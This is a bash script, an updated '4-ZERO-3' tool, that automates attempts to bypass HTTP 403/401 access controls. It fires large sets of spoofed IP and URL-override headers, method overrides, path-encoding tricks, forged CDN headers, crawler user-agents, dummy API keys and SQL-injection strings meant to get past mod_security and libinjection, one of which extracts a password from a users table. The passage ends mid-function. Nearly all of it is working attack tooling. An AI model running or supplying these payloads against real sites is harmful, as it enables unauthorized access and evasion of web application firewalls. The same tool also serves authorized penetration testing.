#!/bin/bash
# ╔══════════════════════════════════════════════════════════════╗
# ║         4-ZERO-3  ·  2026 Edition                           ║
# ║         403/401 Bypass Automation — Updated Payloads        ║
# ║         Original by @me_dheeraj  |  2026 Update             ║
# ╚══════════════════════════════════════════════════════════════╝

# ── Colors ─────────────────────────────────────────────────────
red='\e[31m'; green='\e[32m'; blue='\e[34m'; cyan='\e[96m'
ltcyan='\e[96m'; yellow='\e[33m'; magenta='\e[35m'
black='\e[38;5;016m'; bluebg='\e[48;5;038m'${black}; end='\e[0m'
bold='\e[1m'; dim='\e[2m'
termwidth="$(tput cols 2>/dev/null || echo 80)"

# ── Globals ─────────────────────────────────────────────────────
target=""; domain=""; path=""
mode=""; delay=0; threads=1
output_file=""; log_only_hits=false
bypass_count=0; hit_count=0

# ── Modern User-Agent Pool (2026) ───────────────────────────────
UA_POOL=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:132.0) Gecko/20100101 Firefox/132.0"
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"
  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1"
  "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36"
  "Googlebot/2.1 (+http://www.google.com/bot.html)"
  "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
)

# Pick a random UA for each request
ua() { echo "${UA_POOL[$((RANDOM % ${#UA_POOL[@]}))]}"; }

# ── Curl wrapper with delay + random UA ─────────────────────────
do_curl() {
  [[ $delay -gt 0 ]] && sleep "$delay"
  curl -ks -o /dev/null -i -w 'Status: %{http_code}, Length : %{size_download}\n' \
    -H "User-Agent: $(ua)" \
    --max-time 10 \
    "$@"
}

# ── Print / logging ──────────────────────────────────────────────
print_result() {
  local label="$1" payload_text="$2"
  bypass_count=$((bypass_count + 1))
  status=$(echo "${code}" | awk '{print $2}' | sed 's/,$//g')
  local line
  if [[ ${status} =~ 2.. ]]; then
    hit_count=$((hit_count + 1))
    line="${green}${bold} ${code} ${end} ✅  ${label}"
    printf "${line}\n"
    printf "${payload_text}\n"
    [[ -n "$output_file" ]] && echo -e "HIT | ${code} | ${label}\n${payload_text}" >> "$output_file"
  elif [[ ${status} =~ 3.. ]]; then
    line="${yellow} ${code} ${end}  ${dim}${label}${end}"
    $log_only_hits || printf "${line}\n"
    [[ -n "$output_file" ]] && ! $log_only_hits && echo -e "3XX | ${code} | ${label}" >> "$output_file"
  elif [[ ${status} =~ 5.. ]]; then
    line="${ltcyan} ${code} ${end}  ${dim}${label}${end}"
    $log_only_hits || printf "${line}\n"
  else
    line="${red} ${code} ${end}  ${dim}${label}${end}"
    $log_only_hits || printf "${line}\n"
  fi
}

box() {
  local payload_cmd="$1"
  printf "╭$(printf '%.0s─' $(seq "$((termwidth - 2))"))╮\n"
  printf "${cyan} ╰─> PAYLOAD${end} : ${green}${payload_cmd}${end}\n"
  printf "╰$(printf '%.0s─' $(seq "$((termwidth - 2))"))╯\n"
}

# ── Banner ───────────────────────────────────────────────────────
function banner(){
  echo ""
  echo -e "${bold}${cyan}   ██╗  ██╗       ███████╗███████╗██████╗  ██████╗     ██████╗ ${end}"
  echo -e "${bold}${cyan}   ██║  ██║       ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗   ╚════██╗${end}"
  echo -e "${bold}${cyan}   ███████║  ─────  ███╔╝ █████╗  ██████╔╝██║   ██║    █████╔╝${end}"
  echo -e "${bold}${cyan}   ╚════██║         ███╔╝ ██╔══╝  ██╔══██╗██║   ██║   ██╔═══╝ ${end}"
  echo -e "${bold}${cyan}        ██║        ███████╗███████╗██║  ██║╚██████╔╝██╗███████╗${end}"
  echo -e "${bold}${cyan}        ╚═╝        ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝╚══════╝${end}"
  echo ""
  echo -e "   ${magenta}403/401 Bypass Automation — 2026 Edition${end}"
  echo -e "   ${dim}Original: @me_dheeraj  |  Updated payloads & techniques${end}"
  echo ""
}

# ── Usage ────────────────────────────────────────────────────────
function usage(){
  printf "\n${bold}Usage:${end}\n"
  printf "\t403-bypass -u <URL> [MODE] [OPTIONS]\n\n"
  printf "\t${yellow}-u, --url${end} <scheme://domain.tld/path>   Target URL with path\n\n"
  printf "${bold}BYPASS MODEs${end}\n"
  printf "\t${cyan}--header${end}       HTTP Header injection bypass\n"
  printf "\t${cyan}--protocol${end}     Protocol scheme bypass\n"
  printf "\t${cyan}--port${end}         Port header bypass\n"
  printf "\t${cyan}--HTTPmethod${end}   HTTP verb/method bypass\n"
  printf "\t${cyan}--encode${end}       URL encoding & path normalization bypass\n"
  printf "\t${cyan}--SQLi${end}         mod_security / libinjection bypass\n"
  printf "\t${cyan}--useragent${end}    User-Agent rotation bypass\n"
  printf "\t${cyan}--cloudflare${end}   Cloudflare / CDN-specific bypass\n"
  printf "\t${cyan}--api${end}          API Gateway / versioning bypass\n"
  printf "\t${cyan}--exploit${end}      Run ALL bypass modes\n\n"
  printf "${bold}OPTIONS${end}\n"
  printf "\t${yellow}--delay${end} <sec>        Sleep N seconds between requests\n"
  printf "\t${yellow}--output${end} <file>      Log results to file\n"
  printf "\t${yellow}--hits-only${end}          Only display/log 2xx hits\n"
  printf "\t${yellow}-h, --help${end}           Show this help\n\n"
  printf "${bold}STATUS COLOURS${end}\n"
  printf "\t${green}GREEN${end}  :  ${green}2xx — Potential bypass!${end}\n"
  printf "\t${yellow}YELLOW${end} :  ${yellow}3xx — Redirect${end}\n"
  printf "\t${red}RED${end}    :  ${red}4xx — Still blocked${end}\n"
  printf "\t${ltcyan}CYAN${end}   :  ${ltcyan}5xx — Server error${end}\n\n"
  printf "${dim}NOTE: Multiple 200s with identical Content-Length = likely false positive.\n${end}\n"
}

# ════════════════════════════════════════════════════════════════
# 1. HEADER BYPASS
# ════════════════════════════════════════════════════════════════
function Header_Bypass(){
  echo -e "\n${blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${end}"
  echo -e "${bold}${cyan}  [+] HTTP Header Bypass${end}"
  echo -e "${blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${end}\n"

  # ── IP Spoofing Headers ──────────────────────────────────────
  local ip_headers=(
    "X-Forwarded-For"
    "X-Forwarded-For-Original"
    "X-Originally-Forwarded-For"
    "X-Originating-IP"
    "X-Originating-"
    "X-Remote-IP"
    "X-Remote-Addr"
    "X-Client-IP"
    "X-Host"
    "X-Forwarded-Host"
    "X-Real-Ip"
    "X-ProxyUser-Ip"
    "X-Proxy-Url"
    "X-Custom-IP-Authorization"
    "X-Forwarded-By"
    "X-Forwarded-Server"
    "X-Forwarded"
    "X-Forwarder-For"
    "X-Http-Destinationurl"
    "X-Http-Host-Override"
    "X-Original-Remote-Addr"
    "CF-Connecting-IP"
    "CF-Connecting_IP"
    "True-Client-IP"
    "Fastly-Client-IP"
    "Akamai-Origin-Hop"
    "Cdn-Src-Ip"
    "Proxy-Client-IP"
    "WL-Proxy-Client-IP"
    "X-Azure-ClientIP"
    "X-Azure-SocketIP"
    "Forwarded-For"
    "Forwarded"
    "Client-IP"
    "X-Forward-For"
    "Base-Url"
    "Http-Url"
    "Proxy-Host"
    "Proxy-Url"
    "Real-Ip"
    "Redirect"
    "Referrer"
    "Request-Uri"
    "Uri"
    "Url"
    "Destination"
    "Proxy"
    "X-WAP-Profile"
  )

  local ip_vals=("127.0.0.1" "0.0.0.0" "localhost" "::1" "0177.0.0.1" "2130706433" "0x7f000001" "127.1" "10.0.0.1" "192.168.1.1" "172.16.0.1")

  for hdr in "${ip_headers[@]}"; do
    for ip in "${ip_vals[@]}"; do
      code=$(do_curl -H "${hdr}: ${ip}" -X GET "${target}")
      print_result "${hdr}: ${ip}" "$(box "curl -ks -H '${hdr}: ${ip}' -X GET '${target}'")"
    done
  done

  # ── URL Override Headers ─────────────────────────────────────
  local url_hdrs=("X-Original-URL" "X-Rewrite-URL" "X-Override-URL" "X-Replace-URL")
  for hdr in "${url_hdrs[@]}"; do
    code=$(do_curl -H "${hdr}: /${path}" -X GET "${target}/anything")
    print_result "${hdr}: /${path}" "$(box "curl -ks -H '${hdr}: /${path}' -X GET '${target}/anything'")"
  done

  # ── Misc header tricks ───────────────────────────────────────
  code=$(do_curl -H "Content-Length: 0" -X GET "${target}")
  print_result "Content-Length: 0" "$(box "curl -ks -H 'Content-Length: 0' -X GET '${target}'")"

  code=$(do_curl -H "Referer: ${target}" -X GET "${target}")
  print_result "Referer: ${target}" "$(box "curl -ks -H 'Referer: ${target}' -X GET '${target}'")"

  code=$(do_curl -H "X-OReferrer: https%3A%2F%2Fwww.google.com%2F" -X GET "${target}")
  print_result "X-OReferrer: google.com" "$(box "curl -ks -H 'X-OReferrer: https%3A%2F%2Fwww.google.com%2F' '${target}'")"

  # ── Profile/Arbitrary ────────────────────────────────────────
  code=$(do_curl -H "Profile: http://${domain}" -X GET "${target}")
  print_result "Profile: http://${domain}" "$(box "curl -ks -H 'Profile: http://${domain}' '${target}'")"

  code=$(do_curl -H "X-Arbitrary: http://${domain}" -X GET "${target}")
  print_result "X-Arbitrary: http://${domain}" "$(box "curl -ks -H 'X-Arbitrary: http://${domain}' '${target}'")"

  code=$(do_curl -H "X-HTTP-DestinationURL: http://${domain}" -X GET "${target}")
  print_result "X-HTTP-DestinationURL: http://${domain}" "$(box "curl -ks -H 'X-HTTP-DestinationURL: http://${domain}' '${target}'")"

  # ── Combo double-header attacks ──────────────────────────────
  code=$(do_curl -H "X-Forwarded-For: 127.0.0.1" -H "X-Forwarded-Host: localhost" -X GET "${target}")
  print_result "XFF+XFH combo (127.0.0.1/localhost)" "$(box "curl -ks -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Forwarded-Host: localhost' '${target}'")"

  code=$(do_curl -H "X-Forwarded-For: 127.0.0.1, 10.0.0.1" -X GET "${target}")
  print_result "X-Forwarded-For: 127.0.0.1, 10.0.0.1" "$(box "curl -ks -H 'X-Forwarded-For: 127.0.0.1, 10.0.0.1' '${target}'")"

  # ── Cache poisoning style ────────────────────────────────────
  code=$(do_curl -H "X-Forwarded-Host: ${domain}" -H "X-Forwarded-Scheme: https" -X GET "${target}")
  print_result "Cache-Poison XFH+XFS" "$(box "curl -ks -H 'X-Forwarded-Host: ${domain}' -H 'X-Forwarded-Scheme: https' '${target}'")"

  # ── Host header override ─────────────────────────────────────
  code=$(do_curl -H "Host: localhost" -X GET "${target}")
  print_result "Host: localhost" "$(box "curl -ks -H 'Host: localhost' '${target}'")"

  code=$(do_curl -H "Host: 127.0.0.1" -X GET "${target}")
  print_result "Host: 127.0.0.1" "$(box "curl -ks -H 'Host: 127.0.0.1' '${target}'")"

  code=$(do_curl -H "Host: ${domain}" -H "X-Forwarded-Host: internal.${domain}" -X GET "${target}")
  print_result "Host: ${domain} + X-Forwarded-Host: internal.${domain}" "$(box "curl -ks -H 'Host: ${domain}' -H 'X-Forwarded-Host: internal.${domain}' '${target}'")"

  # ── X-Custom-IP-Authorization path combos ───────────────────
  code=$(do_curl -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "${target}..;/")
  print_result "X-Custom-IP-Authorization + ..;/ path" "$(box "curl -ks -H 'X-Custom-IP-Authorization: 127.0.0.1' '${target}..;/'")"
}

# ════════════════════════════════════════════════════════════════
# 2. PROTOCOL BYPASS
# ════════════════════════════════════════════════════════════════
function Protocol_Bypass(){
  echo -e "\n${blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${end}"
  echo -e "${bold}${cyan}  [+] Protocol Based Bypass${end}"
  echo -e "${blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${end}\n"

  code=$(do_curl -X GET "http://${domain}/${path}")
  print_result "HTTP scheme" "$(box "curl -ks -X GET 'http://${domain}/${path}'")"

  code=$(do_curl -X GET "https://${domain}/${path}")
  print_result "HTTPS scheme" "$(box "curl -ks -X GET 'https://${domain}/${path}'")"

  code=$(do_curl -H "X-Forwarded-Scheme: http" -X GET "${target}")
  print_result "X-Forwarded-Scheme: http" "$(box "curl -ks -H 'X-Forwarded-Scheme: http' '${target}'")"

  code=$(do_curl -H "X-Forwarded-Scheme: https" -X GET "${target}")
  print_result "X-Forwarded-Scheme: https" "$(box "curl -ks -H 'X-Forwarded-Scheme: https' '${target}'")"

  code=$(do_curl -H "X-Forwarded-Proto: http" -X GET "${target}")
  print_result "X-Forwarded-Proto: http" "$(box "curl -ks -H 'X-Forwarded-Proto: http' '${target}'")"

  code=$(do_curl -H "X-Forwarded-Proto: https" -X GET "${target}")
  print_result "X-Forwarded-Proto: https" "$(box "curl -ks -H 'X-Forwarded-Proto: https' '${target}'")"

  code=$(do_curl -H "X-Forwarded-Proto: http" -H "X-Forwarded-Port: 80" -X GET "${target}")
  print_result "XFP: http + XFPort: 80" "$(box "curl -ks -H 'X-Forwarded-Proto: http' -H 'X-Forwarded-Port: 80' '${target}'")"

  # ── HTTP/1.0 downgrade ───────────────────────────────────────
  code=$(curl -ks -o /dev/null -i --http1.0 \
    -w 'Status: %{http_code}, Length : %{size_download}\n' \
    -H "User-Agent: $(ua)" \
    "${target}")
  print_result "HTTP/1.0 downgrade" "$(box "curl -ks --http1.0 '${target}'")"

  # ── HTTP/2 force ─────────────────────────────────────────────
  code=$(curl -ks -o /dev/null -i --http2 \
    -w 'Status: %{http_code}, Length : %{size_download}\n' \
    -H "User-Agent: $(ua)" \
    "${target}" 2>/dev/null)
  print_result "HTTP/2 force" "$(box "curl -ks --http2 '${target}'")"
}

# ════════════════════════════════════════════════════════════════
# 3. PORT BYPASS
# ════════════════════════════════════════════════════════════════
function Port_Bypass(){
  echo -e "\n${blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${end}"
  echo -e "${bold}${cyan}  [+] Port Based Bypass${end}"
  echo -e "${blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${end}\n"

  local ports=(80 443 4443 8080 8443 8000 8008 8888 9000 9090 9443 3000 5000 7443 10443)
  for port in "${ports[@]}"; do
    code=$(do_curl -H "X-Forwarded-Port: ${port}" -X GET "${target}")
    print_result "X-Forwarded-Port: ${port}" "$(box "curl -ks -H 'X-Forwarded-Port: ${port}' '${target}'")"
  done
}

# ════════════════════════════════════════════════════════════════
# 4. HTTP METHOD BYPASS
# ════════════════════════════════════════════════════════════════
function HTTP_Method_Bypass(){
  echo -e "\n${blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${end}"
  echo -e "${bold}${cyan}  [+] HTTP Method Bypass${end}"
  echo -e "${blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${end}\n"

  local methods=(GET POST HEAD OPTIONS PUT DELETE PATCH TRACE TRACK CONNECT UPDATE LOCK PROPFIND PROPPATCH MKCOL COPY MOVE SEARCH PURGE)
  for method in "${methods[@]}"; do
    code=$(do_curl -L -o /dev/null \
      -w 'Status: %{http_code}, Length : %{size_download}\n' \
      -H "User-Agent: $(ua)" \
      -X "${method}" "${target}")
    print_result "${method}" "$(box "curl -ks '${target}' -L -X ${method}")"
  done

  # ── Override method via headers ──────────────────────────────
  for override_hdr in "X-HTTP-Method-Override" "X-Method-Override" "X-HTTP-Method" "_method"; do
    for method in GET POST HEAD DELETE PUT PATCH; do
      code=$(do_curl -H "${override_hdr}: ${method}" -X POST "${target}")
      print_result "${override_hdr}: ${method} (via POST)" "$(box "curl -ks -H '${override_hdr}: ${method}' -X POST '${target}'")"
    done
  done
}

# ════════════════════════════════════════════════════════════════
# 5. URL ENCODE BYPASS
# ════════════════════════════════════════════════════════════════
function URL_Encode_Bypass(){
  echo -e "\n${blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${end}"
  echo -e "${bold}${cyan}  [+] URL Encode / Path Normalization Bypass${end}"
  echo -e "${blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${end}\n"

  # ── Classic path suffixes ────────────────────────────────────
  local suffixes=(
    "/"  "//"  "///"
    "/./"  "/../"  "/;"  "/;/"  "/;x"
    "#?"  "%09"  "%09%3b"  "%09.."  "%09;"  "%20"
    "%23%3f"  "%252f"  "%252f/"  "%252f%252f"
    "%2e"  "%2e/"  "%2e%2e"  "%2e%2e/"
    "%2f"  "%2f/"  "%2f%2f"  "%2f%20%23"  "%2f%23"
    "%2f%3b%2f"  "%2f%3b%2f%2f"  "%2f%3f"  "%2f%3f/"
    "%3b"  "%3b%09"  "%3b%2f%2e%2e"  "%3b%2f%2e%2e%2f%2e%2e%2f%2f"
    "%3b%2f%2e."  "%3b%2f.."
    "../"  "..//"  "..;"  "..;/"
    ".json"  ".css"  ".html"  ".js"  "?cb=1"  "?v=1"
    "?debug=1"  "?test=1"  "?lang=en"  "?format=json"
    "~"  "~/"  "#"  "?"
  )

  for sfx in "${suffixes[@]}"; do
    code=$(do_curl "${target}${sfx}")
    print_result "Suffix [${sfx}]" "$(box "curl -k -s '${target}${sfx}'")"
  done

  # ── Unicode / overlong encoding ──────────────────────────────
  local unicode_paths=(
    "${target/%2f${path}}"    # %2f before path segment
    "${target}/\u002e\u002e"  # unicode dotdot
  )

  # Overlong UTF-8 slash
  code=$(do_curl "${target}%c0%af")
  print_result "Overlong UTF-8 slash [%c0%af]" "$(box "curl -k -s '${target}%c0%af'")"

  code=$(do_curl "${target}%e0%80%af")
  print_result "Overlong UTF-8 slash [%e0%80%af]" "$(box "curl -k -s '${target}%e0%80%af'")"

  # ── Path prefix tricks ───────────────────────────────────────
  local scheme
  scheme=$(echo "${target}" | cut -d: -f1)
  local base="${scheme}://${domain}"

  code=$(do_curl "${base}//${path}")
  print_result "Double slash prefix [//${path}]" "$(box "curl -k -s '${base}//${path}'")"

  code=$(do_curl "${base}/%2f${path}")
  print_result "%2f prefix" "$(box "curl -k -s '${base}/%2f${path}'")"

  code=$(do_curl "${base}/./${path}")
  print_result "Dot-slash prefix [./${path}]" "$(box "curl -k -s '${base}/./${path}'")"

  # ── Semicolon injection ──────────────────────────────────────
  local pparts
  IFS='/' read -ra pparts <<< "${path}"
  local last="${pparts[-1]}"
  local pbase="${target%/*}"

  code=$(do_curl "${pbase}/;${last}")
  print_result ";${last}" "$(box "curl -k -s '${pbase}/;${last}'")"

  code=$(do_curl "${target}/;${path}/")
  print_result ";${path}/" "$(box "curl -k -s '${target}/;${path}/'")"

  code=$(do_curl "${target}/%2e;/${last}")
  print_result "%2e;/${last}" "$(box "curl -k -s '${target}/%2e;/${last}'")"

  # ── Case variation ───────────────────────────────────────────
  code=$(do_curl "${base}/${path^^}")
  print_result "Uppercase path [${path^^}]" "$(box "curl -k -s '${base}/${path^^}'")"

  # Title case attempt
  code=$(do_curl "${base}/${path~}")
  print_result "Mixed case path" "$(box "curl -k -s '${base}/${path~}'")"

  # ── Null byte ────────────────────────────────────────────────
  code=$(do_curl "${target}%00")
  print_result "Null byte [%00]" "$(box "curl -k -s '${target}%00'")"

  code=$(do_curl "${target}%00.html")
  print_result "Null byte + .html" "$(box "curl -k -s '${target}%00.html'")"
}

# ════════════════════════════════════════════════════════════════
# 6. SQLi / libinjection BYPASS
# ════════════════════════════════════════════════════════════════
function SQLi_libinjection(){
  echo -e "\n${blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${end}"
  echo -e "${bold}${cyan}  [+] mod_security & libinjection Bypass${end}"
  echo -e "${blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${end}\n"

  local payloads=(
    "'%20or%201.e(%22)%3D'"
    "1.e(ascii"
    "1.e(substring("
    "1.e(ascii%201.e(substring(1.e(select%20password%20from%20users%20limit%201%201.e%2C1%201.e)%201.e%2C1%201.e%2C1%201.e)1.e)1.e)%20%3D%2070%20or'1'%3D'2'"
    # 2026 additions
    "1'%20OR%20'1'%3D'1"
    "1%20AND%201%3D1"
    "1%20UNION%20SELECT%20NULL--"
    "1%27%20WAITFOR%20DELAY%20'0:0:5'--"
    "1%20and%20sleep(0)"
    "%27%20OR%20%271%27%3D%271"
    "admin'--"
    "1%3BSELECT%201"
    "1%20OR%201%3D1"
    "%22%20or%20%221%22%3D%221"
  )

  for pl in "${payloads[@]}"; do
    code=$(do_curl "${target}/${pl}")
    print_result "SQLi payload [${pl:0:40}...]" "$(box "curl -k -s '${target}/${pl}'")"
  done
}

# ════════════════════════════════════════════════════════════════
# 7. USER-AGENT BYPASS
# ════════════════════════════════════════════════════════════════
function UserAgent_Bypass(){
  echo -e "\n${blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${end}"
  echo -e "${bold}${cyan}  [+] User-Agent Bypass${end}"
  echo -e "${blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${end}\n"

  local uas=(
    "Googlebot/2.1 (+http://www.google.com/bot.html)"
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
    "Twitterbot/1.0"
    "LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)"
    "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)"
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
    "Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot.html)"
    "curl/7.88.1"
    "python-requests/2.31.0"
    "Go-http-client/1.1"
    "Wget/1.21.3"
    "libwww-perl/6.67"
    "Jakarta Commons-HttpClient/3.1"
    "Java/21.0.1"
    "axios/1.6.2"
    "node-fetch/3.3.2"
    ""  # empty UA
    "."  # dot UA
    "-"
    "null"
  )

  for ua_str in "${uas[@]}"; do
    code=$(curl -ks -o /dev/null -i \
      -w 'Status: %{http_code}, Length : %{size_download}\n' \
      -H "User-Agent: ${ua_str}" \
      --max-time 10 \
      "${target}")
    [[ $delay -gt 0 ]] && sleep "$delay"
    print_result "UA: [${ua_str:0:50}]" "$(box "curl -ks -A '${ua_str}' '${target}'")"
  done
}

# ════════════════════════════════════════════════════════════════
# 8. CLOUDFLARE / CDN BYPASS  (2026)
# ════════════════════════════════════════════════════════════════
function Cloudflare_Bypass(){
  echo -e "\n${blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${end}"
  echo -e "${bold}${cyan}  [+] Cloudflare / CDN Bypass (2026)${end}"
  echo -e "${blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${end}\n"

  # ── CF-specific headers ──────────────────────────────────────
  code=$(do_curl -H "CF-Connecting-IP: 127.0.0.1" "${target}")
  print_result "CF-Connecting-IP: 127.0.0.1" "$(box "curl -ks -H 'CF-Connecting-IP: 127.0.0.1' '${target}'")"

  code=$(do_curl -H "CF-Connecting-IP: 1.1.1.1" "${target}")
  print_result "CF-Connecting-IP: 1.1.1.1 (CF itself)" "$(box "curl -ks -H 'CF-Connecting-IP: 1.1.1.1' '${target}'")"

  code=$(do_curl -H "CF-Worker: 1" "${target}")
  print_result "CF-Worker: 1" "$(box "curl -ks -H 'CF-Worker: 1' '${target}'")"

  code=$(do_curl -H "CF-IPCountry: US" "${target}")
  print_result "CF-IPCountry: US" "$(box "curl -ks -H 'CF-IPCountry: US' '${target}'")"

  code=$(do_curl -H "CF-Ray: 7d2f8e5c2a9b0001-EWR" "${target}")
  print_result "CF-Ray spoofed" "$(box "curl -ks -H 'CF-Ray: 7d2f8e5c2a9b0001-EWR' '${target}'")"

  code=$(do_curl -H "CDN-Loop: cloudflare" "${target}")
  print_result "CDN-Loop: cloudflare" "$(box "curl -ks -H 'CDN-Loop: cloudflare' '${target}'")"

  # ── Akamai / Fastly / AWS CF ─────────────────────────────────
  code=$(do_curl -H "Fastly-Client-IP: 127.0.0.1" "${target}")
  print_result "Fastly-Client-IP: 127.0.0.1" "$(box "curl -ks -H 'Fastly-Client-IP: 127.0.0.1' '${target}'")"

  code=$(do_curl -H "Fastly-FF: cluster=prod" "${target}")
  print_result "Fastly-FF: cluster=prod" "$(box "curl -ks -H 'Fastly-FF: cluster=prod' '${target}'")"

  code=$(do_curl -H "Akamai-Origin-Hop: 1" "${target}")
  print_result "Akamai-Origin-Hop: 1" "$(box "curl -ks -H 'Akamai-Origin-Hop: 1' '${target}'")"

  code=$(do_curl -H "X-Akamai-Debug: true" "${target}")
  print_result "X-Akamai-Debug: true" "$(box "curl -ks -H 'X-Akamai-Debug: true' '${target}'")"

  # ── AWS CloudFront ───────────────────────────────────────────
  code=$(do_curl -H "CloudFront-Viewer-Country: US" "${target}")
  print_result "CloudFront-Viewer-Country: US" "$(box "curl -ks -H 'CloudFront-Viewer-Country: US' '${target}'")"

  code=$(do_curl -H "X-Amz-Cf-Id: bypass" "${target}")
  print_result "X-Amz-Cf-Id: bypass" "$(box "curl -ks -H 'X-Amz-Cf-Id: bypass' '${target}'")"

  # ── WAF bypass via Accept/Content-Type ───────────────────────
  local content_types=(
    "application/json"
    "application/xml"
    "text/html; charset=utf-8"
    "application/x-www-form-urlencoded"
    "multipart/form-data"
    "application/octet-stream"
  )
  for ct in "${content_types[@]}"; do
    code=$(do_curl -H "Content-Type: ${ct}" "${target}")
    print_result "Content-Type: ${ct}" "$(box "curl -ks -H 'Content-Type: ${ct}' '${target}'")"
  done

  # ── Accept-Encoding tricks ───────────────────────────────────
  code=$(do_curl -H "Accept-Encoding: gzip, deflate, br" "${target}")
  print_result "Accept-Encoding: gzip,deflate,br" "$(box "curl -ks -H 'Accept-Encoding: gzip, deflate, br' '${target}'")"

  # ── TLS fingerprint confusion (no SNI) ──────────────────────
  code=$(curl -ks -o /dev/null -i \
    -w 'Status: %{http_code}, Length : %{size_download}\n' \
    -H "User-Agent: $(ua)" \
    --resolve "${domain}:443:127.0.0.1" \
    "${target}" 2>/dev/null || echo "Status: 000, Length : 0")
  print_result "Resolve override (no real SNI routing)" "$(box "curl -ks --resolve '${domain}:443:127.0.0.1' '${target}'")"
}

# ════════════════════════════════════════════════════════════════
# 9. API GATEWAY BYPASS  (2026)
# ════════════════════════════════════════════════════════════════
function API_Bypass(){
  echo -e "\n${blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${end}"
  echo -e "${bold}${cyan}  [+] API Gateway / Versioning Bypass (2026)${end}"
  echo -e "${blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${end}\n"

  local scheme; scheme=$(echo "${target}" | cut -d: -f1)
  local base="${scheme}://${domain}"

  # ── API version path substitution ────────────────────────────
  local versions=(v1 v2 v3 v4 v5 v1.0 v2.0 api api/v1 api/v2 rest REST)
  for ver in "${versions[@]}"; do
    code=$(do_curl "${base}/${ver}/${path}")
    print_result "Version prefix [/${ver}/]" "$(box "curl -ks '${base}/${ver}/${path}'")"
  done

  # ── API key / token headers ───────────────────────────────────
  local api_key_headers=("X-Api-Key" "X-API-Key" "Api-Key" "apikey" "x-apikey" "Authorization")
  local dummy_vals=("undefined" "null" "0" "true" "1" "" "test" "Bearer undefined" "Bearer null")
  for hdr in "${api_key_headers[@]}"; do
    for val in "${dummy_vals[@]}"; do
      code=$(do_curl -H "${hdr}: ${val}" "${target}")
      print_result "${hdr}: ${val}" "$(box "curl -ks -H '${hdr}: ${val}' '${target}'")"
    done
  done

  # ── GraphQL endpoint confusion ────────────────────────────────
  local gql_paths=(graphql graphiql api/graphql v1/graphql query)
  for gp in "${gql_paths[@]}"; do
    code=$(do_curl -X POST -H "Content-Type: application/json" \
      -d '{"query":"{__typename}"}' \
      "${base}/${gp}")
    print_result "GraphQL POST [/${gp}]" "$(box "curl -ks -X POST -H 'Content-Type: application/json' -d '{\"query\":\"{__typename}\"}' '${base}/${gp}'")"
  done

  # ── Path parameter injection ──────────────────────────────────
  code=$(do_curl "${target}?_method=GET")
  print_result "_method=GET query param" "$(box "curl -ks '${target}?_method=GET'")"

  code=$(do_curl "${target}?callback=bypass")
  print_result "JSONP callback param" "$(box "curl -ks '${target}?callback=bypass'")"

  code=$(do_curl "${target}?format=json")
  print_result "?format=json" "$(box "curl -ks '${target}?format=json'")"

  code=$(do_curl "${target}.json")
  print_result "Path + .json extension" "$(box "curl -ks '${target}.json'")"

  code=$(do_curl "${target}.xml")
  print_result "Path + .xml extension" "$(box "curl -ks '${target}.xml'")"

  # ── Accept header negotiation ─────────────────────────────────
  local accept_types=("application/json" "application/xml" "text/html" "*/*" "application/vnd.api+json")
  for at in "${accept_types[@]}"; do
    code=$(do_curl -H "Accept: ${at}" "${target}")
    print_result "Accept: ${at}" "$(box "curl -ks -H 'Accept: ${at}' '${target}'")"
  done

  # ── Internal microservice routing ─────────────────────────────
